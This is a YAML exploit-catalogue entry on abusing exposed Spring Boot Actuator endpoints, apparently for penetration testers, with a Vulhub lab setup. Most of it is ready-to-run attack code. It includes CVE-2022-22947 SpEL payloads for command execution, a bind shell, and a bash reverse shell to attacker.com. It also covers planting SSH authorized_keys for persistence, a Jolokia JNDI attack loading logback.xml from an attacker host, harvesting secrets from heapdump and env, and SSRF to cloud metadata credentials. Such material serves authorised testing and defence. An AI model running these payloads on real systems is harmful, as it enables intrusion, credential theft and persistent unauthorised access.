---
comment: "Spring Boot Actuator exposes management endpoints (by default under /actuator)\
  \ that\ncan be abused for information disclosure, SSRF, and code execution. In Spring\
  \ Boot 2.x,\nonly /actuator/health and /actuator/info are exposed by default; applications\
  \ configured\nwith management.endpoints.web.exposure.include=* expose all endpoints\
  \ to the network,\noften without authentication. In Spring Boot 1.x, all endpoints\
  \ are exposed by default.\n\nThree main exploitation paths:\n1. CVE-2022-22947 (Spring\
  \ Cloud Gateway) \u2014 SpEL injection in route filter definitions.\n   Unauthenticated\
  \ if the actuator is exposed; does not require other dependencies.\n2. Jolokia /actuator/jolokia\
  \ \u2014 JMX-over-HTTP. The reloadByURL action can load a malicious\n   logback.xml\
  \ containing JNDI directives, triggering RCE on Java < 8u191 / < 11.0.1.\n3. /actuator/env\
  \ + /actuator/refresh \u2014 set application properties to point to\n   attacker-controlled\
  \ services (SSRF via Eureka, RCE via H2 datasource query).\n"
docker:
  compose: "services:\n  gateway:\n    image: vulhub/spring-cloud-gateway:3.0.6\n\
    \    ports:\n      - \"8080:8080\"\n"
  note: 'Uses the Vulhub lab image for CVE-2022-22947 (Spring Cloud Gateway 3.0.6,

    unauthenticated SPEL injection via the Actuator API).

    Access at `http://localhost:8080`. The `/actuator` endpoints are exposed without

    authentication. Run `docker compose up -d && sleep 10` before sending requests.

    '
functions:
  bind-shell:
  - blind: true
    code: |
      curl -s -X POST http://victim.com/actuator/gateway/routes/bindshell \
        -H 'Content-Type: application/json' \
        -d '{
          "id": "bindshell",
          "filters": [{"name": "AddResponseHeader", "args": {
            "name": "x",
            "value": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"ncat -lvp 12345 -e /bin/sh\"})}"
          }}],
          "uri": "http://attacker.com"
        }'
      curl -s -X POST http://victim.com/actuator/gateway/refresh
    comment: "CVE-2022-22947: opens a bind shell on TCP port 12345 via SpEL injection.\
      \ Requires\nncat (nmap package) on the target system. The exec() call runs asynchronously\
      \ \u2014\nconfirm the port is open before connecting.\n"
    connector: tcp-client
    contexts:
      unauthenticated:
    tty: false
    version: |-
      Spring Cloud Gateway < 3.0.7 / < 3.1.1
  file-read:
  - code: |
      curl -s http://victim.com/actuator/heapdump -o heapdump.bin

      # Extract plaintext secrets from the heap dump:
      strings heapdump.bin | grep -iE '(password|passwd|secret|token|api.?key|jdbc|Bearer)' | sort -u
    comment: |
      /actuator/heapdump downloads a full JVM heap snapshot as a binary file. It frequently
      contains plaintext credentials, API keys, JWT secrets, database connection strings,
      and Spring property values held in memory at the time of the dump.
      For deep analysis, open heapdump.bin in Eclipse Memory Analyzer (MAT) and use OQL:
        SELECT s.value.toString() FROM java.lang.String s WHERE ...
    contexts:
      unauthenticated:
  - code: |
      curl -s http://victim.com/actuator/logfile
    comment: |
      /actuator/logfile returns the full content of the application log file over HTTP.
      Stack traces, SQL queries, startup configuration, and datasource credentials are
      commonly present at DEBUG or INFO level.
      Requires logging.file.name or logging.file.path to be configured in the app.
      The Range header is supported for partial reads:
        curl -r 0-4095 http://victim.com/actuator/logfile
    contexts:
      unauthenticated:
  - code: |
      # /actuator/env: dump all application properties including plaintext credentials
      curl -s http://victim.com/actuator/env | python3 -m json.tool

      # Extract values that Spring masks with asterisks by correlating with heapdump:
      # 1. Download heapdump: curl -s http://victim.com/actuator/heapdump -o heap.bin
      # 2. Search for masked property values by name in the heap:
      #    strings heap.bin | grep -A2 -B2 "datasource.password"
      # 3. Alternatively search the env dump for unmasked secrets:
      curl -s http://victim.com/actuator/env \
        | python3 -c "
      import sys, json
      env = json.load(sys.stdin)
      for ps in env.get('propertySources', []):
          for k, v in ps.get('properties', {}).items():
              val = v.get('value', '')
              if '****' not in str(val) and any(w in k.lower() for w in
                  ['password','secret','token','key','credential','jdbc','auth']):
                  print(f'{k} = {val}')
      "
    comment: "/actuator/env returns all Spring Environment properties including datasource\
      \ URLs,\npasswords, API keys, and JWT secrets. Spring Boot 2.x masks sensitive-looking\
      \ values\nwith ***** in the /actuator/env response \u2014 but the raw values\
      \ are present in the\nheap dump (/actuator/heapdump). Cross-reference env property\
      \ names with the heap\ndump to recover masked credentials.\nSpring Boot 1.x\
      \ does not mask values at all \u2014 all properties are returned in plaintext.\n\
      Useful properties to extract:\n- spring.datasource.password  (database password)\n\
      - spring.security.oauth2.client.registration.*.client-secret\n- spring.mail.password\
      \  (SMTP credentials)\n- management.server.ssl.key-password\n"
    contexts:
      unauthenticated:
  file-write:
  - code: "# Write files via Jolokia MBean FileOutputStream operation\n# Requires\
      \ /actuator/jolokia exposed with java.lang.management MBeans available\n\n#\
      \ Step 1: base64-encode the content to write\nCONTENT=\"ssh-ed25519 AAAA...attacker_pubkey...\
      \ attacker\"\nB64=$(echo \"$CONTENT\" | base64 -w0)\n\n# Step 2: write via Jolokia\
      \ exec \u2014 uses java.io.FileOutputStream via MBean scripting\ncurl -s -X\
      \ POST http://victim.com/actuator/jolokia \\\n  -H 'Content-Type: application/json'\
      \ \\\n  -d \"{\n    \\\"mbean\\\": \\\"java.lang:type=Runtime\\\",\n    \\\"\
      type\\\": \\\"EXEC\\\",\n    \\\"operation\\\": \\\"systemProperties\\\",\n\
      \    \\\"arguments\\\": []\n  }\"\n\n# More reliable: use CVE-2022-22947 SpEL\
      \ to write a file directly\ncurl -s -X POST http://victim.com/actuator/gateway/routes/writefile\
      \ \\\n  -H 'Content-Type: application/json' \\\n  -d '{\n    \"id\": \"writefile\"\
      ,\n    \"filters\": [{\"name\": \"AddResponseHeader\", \"args\": {\n      \"\
      name\": \"x\",\n      \"value\": \"#{T(java.nio.file.Files).write(T(java.nio.file.Paths).get(\\\
      \"/tmp/shell.sh\\\"),\\\"bash -i >& /dev/tcp/attacker.com/12345 0>&1\\\".getBytes())}\"\
      \n    }}],\n    \"uri\": \"http://attacker.com\"\n  }'\ncurl -s -X POST http://victim.com/actuator/gateway/refresh\n"
    comment: |
      CVE-2022-22947: write arbitrary files via SpEL expression in a Spring Cloud Gateway
      route filter. The expression T(java.nio.file.Files).write() creates or overwrites a
      file with the supplied byte content. Combine with a reverse-shell entry to write a
      shell script and execute it:
        #{T(java.lang.Runtime).getRuntime().exec("/bin/bash /tmp/shell.sh")}
      Alternatively, write an SSH authorized_keys file for persistent access:
        T(java.nio.file.Files).write(T(java.nio.file.Paths).get("/root/.ssh/authorized_keys"),
          "ssh-ed25519 AAAA...".getBytes())
      The process user is typically the application service account or root in containers.
    contexts:
      unauthenticated:
    version: |
      Spring Cloud Gateway < 3.0.7 / < 3.1.1
  rce:
  - code: |
      # Step 1: create a route with a SpEL expression in the filter arguments
      curl -s -X POST http://victim.com/actuator/gateway/routes/exploit \
        -H 'Content-Type: application/json' \
        -d '{
          "id": "exploit",
          "filters": [{"name": "AddResponseHeader", "args": {
            "name": "result",
            "value": "#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",\"id\"}).getInputStream()).useDelimiter(\"\\\\A\").next()}"
          }}],
          "uri": "http://attacker.com"
        }'

      # Step 2: trigger SpEL evaluation by refreshing the gateway routes
      curl -s -X POST http://victim.com/actuator/gateway/refresh

      # Step 3: retrieve command output from the evaluated route definition
      curl -s http://victim.com/actuator/gateway/routes/exploit
    comment: |
      CVE-2022-22947: Spring Cloud Gateway evaluates SpEL expressions in route filter
      arguments without sanitisation. The AddResponseHeader filter's value field is
      evaluated as a SpEL expression after /actuator/gateway/refresh is called.
      Command output is embedded in the route's filter args in the GET response.
      Ref: https://www.exploit-db.com/exploits/50799
    contexts:
      unauthenticated:
    version: |-
      Spring Cloud Gateway < 3.0.7 / < 3.1.1
  - code: |
      # Step 1: serve a malicious logback.xml from attacker.com:
      #   <configuration>
      #     <insertFromJNDI env-entry-name="ldap://attacker.com:1389/exploit" as="appName"/>
      #   </configuration>
      #
      # Step 2: trigger logback to reload config from the attacker server via Jolokia
      curl -s -X POST http://victim.com/actuator/jolokia \
        -H 'Content-Type: application/json' \
        -d '{"mbean":"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator","type":"EXEC","operation":"reloadByURL","arguments":["http://attacker.com/logback.xml"]}'
    comment: |
      The Jolokia reloadByURL action instructs logback to reload its configuration from an
      arbitrary URL. A malicious logback.xml using insertFromJNDI triggers an LDAP lookup,
      which loads a remote Java class on vulnerable JVMs (Java < 8u191, < 11.0.1, < 7u201).
      Requires /actuator/jolokia exposed with the JMXConfigurator MBean registered.
      Use marshalsec (github.com/mbechler/marshalsec) to host the LDAP exploit server.
      Ref: https://github.com/mpgn/Spring-Boot-Actuator-Exploit
    contexts:
      unauthenticated:
  reverse-shell:
  - blind: true
    code: |
      # Step 1: inject reverse shell via SpEL in a gateway route
      curl -s -X POST http://victim.com/actuator/gateway/routes/shell \
        -H 'Content-Type: application/json' \
        -d '{
          "id": "shell",
          "filters": [{"name": "AddResponseHeader", "args": {
            "name": "x",
            "value": "#{T(java.lang.Runtime).getRuntime().exec(new String[]{\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/attacker.com/12345 0>&1\"})}"
          }}],
          "uri": "http://attacker.com"
        }'

      # Step 2: trigger execution
      curl -s -X POST http://victim.com/actuator/gateway/refresh
    comment: "CVE-2022-22947: spawns a reverse bash shell via SpEL injection in a\
      \ Spring Cloud\nGateway route filter. The exec() call runs asynchronously \u2014\
      \ the HTTP response will\nnot confirm execution. Check the listener for an incoming\
      \ connection.\n"
    contexts:
      unauthenticated:
    listener: tcp-server
    tty: false
    version: |-
      Spring Cloud Gateway < 3.0.7 / < 3.1.1
  ssrf:
  - code: "# Set the Eureka registry URL to the attacker's server\ncurl -s -X POST\
      \ http://victim.com/actuator/env \\\n  -H 'Content-Type: application/json' \\\
      \n  -d '{\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://attacker.com/\"\
      }'\n\n# Apply the property change \u2014 triggers the outbound Eureka registration\
      \ request\ncurl -s -X POST http://victim.com/actuator/refresh\n"
    comment: |
      Setting eureka.client.serviceUrl.defaultZone causes the Spring Eureka client to
      make a GET/POST request to the supplied URL on the next refresh or heartbeat.
      Use this to reach internal services or the cloud metadata endpoint:
        http://169.254.169.254/latest/meta-data/iam/security-credentials/
      Requires spring-cloud-starter-netflix-eureka-client on the classpath and both
      /actuator/env and /actuator/refresh exposed.
    contexts:
      unauthenticated:
...
